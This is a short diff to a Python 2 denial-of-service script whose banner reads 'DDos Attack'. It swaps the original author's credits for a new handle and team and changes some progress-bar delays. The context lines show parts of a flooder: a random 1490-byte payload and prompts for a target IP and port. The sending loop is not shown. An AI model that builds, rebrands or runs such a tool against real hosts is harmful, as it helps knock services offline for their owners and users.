@@ -20,10 +20,10 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "Author   : [DARKHEAVEN]"
+print "TEAM     : [DARKHOLE]"
+print "INSTAGRAM: [dark_h_e_a_v_e_n]"
+print "GITHUB   : DarkHeaveN123"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
@@ -35,9 +35,9 @@ time.sleep(5)
 print "[=====               ] 25%"
 time.sleep(5)
 print "[==========          ] 50%"
-time.sleep(5)
+time.sleep(6)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(8)
 print "[====================] 100%"
 time.sleep(3)
 sent = 0
